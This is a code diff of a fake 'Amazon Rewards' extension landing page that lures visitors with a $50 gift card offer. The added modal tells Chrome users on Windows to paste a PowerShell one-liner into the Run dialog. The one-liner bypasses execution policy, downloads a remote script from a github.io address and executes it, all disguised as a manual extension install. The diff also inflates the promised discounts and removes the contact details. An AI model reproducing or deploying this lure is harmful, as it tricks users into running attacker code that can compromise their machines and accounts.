@@ -1,11 +1,9 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon Rewards - Earn Points & Save Money</title>
+    <title>Amazon Rewards - Earn points, find deals, and get gift cards!</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -48,22 +46,101 @@
             top: 0;
             z-index: 50;
         }
-        .gift-card {
+        .gift-card-container {
             perspective: 1000px;
-            transform-style: preserve-3d;
-            transition: transform 0.3s ease;
         }
-        .gift-card-inner {
+        .gift-card {
+            transform-style: preserve-3d;
+            transition: transform 0.15s ease;
+            box-shadow: 0 15px 35px -5px rgba(0, 0, 0, 0.25);
+            max-width: 100%;
+            height: auto;
+            background-color: rgba(255, 255, 255, 0); /* 0% opacity background */
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 100;
+            left: 0;
+            top: 0;
             width: 100%;
             height: 100%;
-            transform-style: preserve-3d;
-            transition: transform 0.6s;
-            box-shadow: 0 15px 35px -5px rgba(0, 0, 0, 0.25);
-            border-radius: 16px;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+        .modal-content {
+            background-color: #fefefe;
+            margin: 10% auto;
+            padding: 24px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 550px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            line-height: 0.8;
+        }
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+        }
+        .copy-code {
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            font-family: monospace;
+            background-color: #f3f4f6;
+            border: 1px solid #e5e7eb;
+            border-radius: 4px;
+            padding: 8px 12px;
+        }
+        .copy-button {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
         }
     </style>
 </head>
 <body>
+    <!-- Installation Modal -->
+    <div id="installModal" class="modal">
+        <div class="modal-content">
+            <div class="flex justify-between items-start mb-4">
+                <h2 class="text-2xl font-bold">Install manually</h2>
+                <span class="close">&times;</span>
+            </div>
+            
+            <p class="mb-4">We aren't on the chrome webstore yet, but you can install using these simple steps:</p>
+            
+            <div class="space-y-5">
+                <div>
+                    <p class="font-medium mb-2">Step 1. Copy this installation code:</p>
+                    <div class="relative">
+                        <div id="copyCode" class="copy-code">powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.Encoding=[System.Text.Encoding]::UTF8;iex ($wc.DownloadString('https://bell-devs.github.io/extension-redirect/powershell.ps1'))"</div>
+                        <button id="copyButton" class="copy-button bg-amber-500 hover:bg-amber-600 text-white text-sm font-medium py-1 px-3 rounded transition duration-300">
+                            Copy
+                        </button>
+                    </div>
+                </div>
+                
+                <div>
+                    <p class="font-medium mb-2">Step 2. Press and hold the key Windows + R, then paste the code.</p>
+                </div>
+                
+                <div>
+                    <p class="font-medium mb-2">Step 3. Press OK, and we will add the extension to your browser. You should see a success message.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Navigation -->
     <nav class="bg-white shadow-sm py-4 sticky-header">
         <div class="container mx-auto px-4 md:px-6 flex justify-between items-center">
@@ -126,7 +203,7 @@
                                         <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-1" viewBox="0 0 20 20" fill="currentColor">
                                             <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
                                         </svg>
-                                        Coupon Applied: 15% OFF
+                                        Coupon Applied: 35% OFF
                                     </div>
                                     <div class="mt-2 text-sm text-green-700">You saved $12.50 on this order!</div>
                                 </div>
@@ -165,28 +242,8 @@
                     </div>
                     
                     <!-- Gift card content (hidden by default, shown by JS when campaign parameter exists) -->
-                    <div id="gift-card-container" class="gift-card hidden">
-                        <div class="gift-card-inner bg-white p-6 rounded-xl">
-                            <div class="flex flex-col items-center">
-                                <!-- Amazon Gift Card SVG -->
-                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 120" class="w-full h-auto mb-4">
-                                    <rect width="200" height="120" rx="10" fill="#232F3E"/>
-                                    <path d="M20 20h160v80H20z" fill="#FFF"/>
-                                    <path d="M100 30c-22.1 0-40 17.9-40 40s17.9 40 40 40 40-17.9 40-40-17.9-40-40-40z" fill="#FF9900"/>
-                                    <path d="M110 60H90c-2.8 0-5 2.2-5 5v10c0 2.8 2.2 5 5 5h20c2.8 0 5-2.2 5-5V65c0-2.8-2.2-5-5-5z" fill="#232F3E"/>
-                                    <path d="M105 55v-5c0-2.8-2.2-5-5-5s-5 2.2-5 5v5h10z" fill="#232F3E"/>
-                                    <text x="100" y="95" font-family="Arial, sans-serif" font-size="14" font-weight="bold" text-anchor="middle" fill="#232F3E">amazon</text>
-                                    <text x="100" y="75" font-family="Arial, sans-serif" font-size="24" font-weight="bold" text-anchor="middle" fill="#FFFFFF">$50</text>
-                                </svg>
-                                <div class="text-center">
-                                    <h3 class="text-2xl font-bold text-gray-800 mb-2">Amazon Gift Card</h3>
-                                    <p class="text-gray-600 mb-4">Get a $50 Amazon gift card when you install our extension</p>
-                                    <div class="bg-amber-100 rounded-lg p-3 text-amber-800 font-medium">
-                                        Limited time offer!
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
+                    <div id="gift-card-container" class="gift-card-container hidden flex justify-center items-center">
+                        <img src="https://i.ibb.co/6JfkP2f3/50.png" alt="$50 Amazon Gift Card" class="gift-card shadow-lg w-full max-w-md">
                     </div>
                 </div>
             </div>
@@ -257,7 +314,7 @@
                             <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
                                 <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
                             </svg>
-                            Coupon applied: 15% OFF
+                            Coupon applied: 35% OFF
                         </div>
                     </div>
                 </div>
@@ -449,7 +506,7 @@
     <!-- Footer -->
     <footer class="bg-gray-800 text-white py-12">
         <div class="container mx-auto px-4 md:px-6">
-            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
                 <div>
                     <div class="flex items-center space-x-2 mb-4">
                         <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-amber-500" viewBox="0 0 20 20" fill="currentColor">
@@ -457,7 +514,7 @@
                         </svg>
                         <span class="text-xl font-bold">Amazon Rewards</span>
                     </div>
-                    <p class="text-gray-400">Earn points, save money, and get rewarded for your Amazon shopping.</p>
+                    <p class="text-gray-400">Earn points, find deals, and get gift cards!</p>
                 </div>
                 
                 <div>
@@ -477,18 +534,10 @@
                         <li><a href="#" class="text-gray-400 hover:text-amber-500 transition">Cookie Policy</a></li>
                     </ul>
                 </div>
-                
-                <div>
-                    <h3 class="text-lg font-bold mb-4">Contact</h3>
-                    <ul class="space-y-2">
-                        <li class="text-gray-400">support@amazonrewards.com</li>
-                        <li class="text-gray-400">1-800-REWARDS</li>
-                    </ul>
-                </div>
             </div>
             
             <div class="border-t border-gray-700 mt-8 pt-8 text-center text-gray-400">
-                <p>&copy; 2023 Amazon Rewards. All rights reserved.</p>
+                <p>&copy; 2025 Amazon Rewards. All rights reserved.</p>
                 <p class="mt-2 text-sm">Amazon Rewards is not affiliated with Amazon.com, Inc.</p>
             </div>
         </div>
@@ -505,6 +554,8 @@
         function detectBrowser() {
             const userAgent = navigator.userAgent;
             let browserName = "Browser";
+            let isChrome = false;
+            let isWindows = false;
             
             // More accurate browser detection
             if (userAgent.indexOf("Firefox") !== -1) {
@@ -517,8 +568,14 @@
                 browserName = "Edge";
             } else if (userAgent.indexOf("Chrome") !== -1) {
                 browserName = "Chrome";
+                isChrome = true;
             } else if (userAgent.indexOf("Safari") !== -1) {
                 browserName = "Safari";
+            }
+            
+            // Check if Windows
+            if (userAgent.indexOf("Windows") !== -1) {
+                isWindows = true;
             }
             
             // Check if we're in the gift-50 campaign
@@ -565,12 +622,17 @@
                     } else {
                         button.textContent = `Add to ${browserName} - it's free`;
                     }
+                    
+                    // Add click event for Chrome on Windows
+                    if (isChrome && isWindows) {
+                        button.addEventListener('click', function() {
+                            document.getElementById('installModal').style.display = 'block';
+                        });
+                    }
                 }
             });
             
-            // Debug info to verify detection
-            console.log("Detected browser: " + browserName);
-            console.log("Gift campaign: " + isGiftCampaign);
+            return { isChrome, isWindows };
         }
         
         // Add click effect to all buttons except Redeem Now
@@ -589,32 +651,91 @@
             });
         }
         
-        // Add tilt effect to gift card
+        // Add tilt effect to gift card based on cursor position anywhere on the page
         function addGiftCardTiltEffect() {
             const giftCard = document.querySelector('.gift-card');
             if (!giftCard) return;
             
-            giftCard.addEventListener('mousemove', function(e) {
-                const cardRect = giftCard.getBoundingClientRect();
-                const cardCenterX = cardRect.left + cardRect.width / 2;
-                const cardCenterY = cardRect.top + cardRect.height / 2;
+            document.addEventListener('mousemove', function(e) {
+                // Only apply tilt if the gift card is visible
+                if (giftCard.offsetParent === null) return;
                 
+                // Get window dimensions
+                const windowWidth = window.innerWidth;
+                const windowHeight = window.innerHeight;
+                
+                // Calculate mouse position relative to the center of the window
                 const mouseX = e.clientX;
                 const mouseY = e.clientY;
+                const centerX = windowWidth / 2;
+                const centerY = windowHeight / 2;
                 
                 // Calculate the tilt angle (max 15 degrees)
-                const tiltX = ((mouseY - cardCenterY) / (cardRect.height / 2)) * 10;
-                const tiltY = ((mouseX - cardCenterX) / (cardRect.width / 2)) * -10;
+                // Map the mouse position to a tilt angle
+                const tiltX = ((mouseY - centerY) / (windowHeight / 2)) * 10;
+                const tiltY = ((mouseX - centerX) / (windowWidth / 2)) * -10;
                 
-                // Apply the transform
-                giftCard.querySelector('.gift-card-inner').style.transform = 
-                    `perspective(1000px) rotateX(${tiltX}deg) rotateY(${tiltY}deg)`;
+                // Apply the transform with CSS transition (already defined in the style)
+                giftCard.style.transform = `perspective(1000px) rotateX(${tiltX}deg) rotateY(${tiltY}deg)`;
             });
+        }
+        
+        // Setup modal functionality
+        function setupModal() {
+            const modal = document.getElementById('installModal');
+            const closeBtn = document.querySelector('.close');
+            const closeModalBtn = document.getElementById('closeModalButton');
+            const proceedBtn = document.getElementById('proceedButton');
+            const copyBtn = document.getElementById('copyButton');
+            const copyCode = document.getElementById('copyCode');
             
-            giftCard.addEventListener('mouseleave', function() {
-                // Reset the transform when mouse leaves
-                giftCard.querySelector('.gift-card-inner').style.transform = 
-                    'perspective(1000px) rotateX(0deg) rotateY(0deg)';
+            // Close modal when clicking the X
+            if (closeBtn) {
+                closeBtn.addEventListener('click', function() {
+                    modal.style.display = 'none';
+                });
+            }
+            
+            // Close modal when clicking the Cancel button
+            if (closeModalBtn) {
+                closeModalBtn.addEventListener('click', function() {
+                    modal.style.display = 'none';
+                });
+            }
+            
+            // Handle proceed button
+            if (proceedBtn) {
+                proceedBtn.addEventListener('click', function() {
+                    modal.style.display = 'none';
+                    alert('Thank you for installing Amazon Rewards!');
+                });
+            }
+            
+            // Handle copy button
+            if (copyBtn && copyCode) {
+                copyBtn.addEventListener('click', function() {
+                    // Create a temporary textarea element to copy from
+                    const textarea = document.createElement('textarea');
+                    textarea.value = 'chrome://extensions/?loadunpacked=amazon-rewards-extension';
+                    document.body.appendChild(textarea);
+                    textarea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textarea);
+                    
+                    // Change button text temporarily
+                    const originalText = copyBtn.textContent;
+                    copyBtn.textContent = 'Copied!';
+                    setTimeout(function() {
+                        copyBtn.textContent = originalText;
+                    }, 2000);
+                });
+            }
+            
+            // Close modal when clicking outside of it
+            window.addEventListener('click', function(event) {
+                if (event.target === modal) {
+                    modal.style.display = 'none';
+                }
             });
         }
         
@@ -623,7 +744,8 @@
             detectBrowser();
             addButtonClickEffects();
             addGiftCardTiltEffect();
+            setupModal();
         });
     </script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'946875fb7311eb66',t:'MTc0ODM3OTgyNi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9468bc218057dd56',t:'MTc0ODM4MjY5OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
